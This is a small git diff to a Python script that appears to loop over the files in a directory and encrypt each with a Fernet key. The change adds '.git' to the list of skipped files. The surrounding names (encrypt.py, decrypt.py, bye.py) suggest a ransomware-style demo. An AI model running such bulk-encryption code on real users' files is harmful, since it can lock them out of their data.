@@ -19,7 +19,7 @@ with open("enc_key",'rb') as key_file:
 
 
 for file in files:
-    if file not in ["env","enc_key","encrypt.py","scripts","__pycache__","decrypt.py","images","app.py","bye.py"]:
+    if file not in ["env","enc_key","encrypt.py","scripts","__pycache__","decrypt.py","images","app.py","bye.py",'.git']:
         f = Fernet(key)
         with open(file,"r") as myfile:
             encrypted_txt = bytes(myfile.read(),"utf-8")
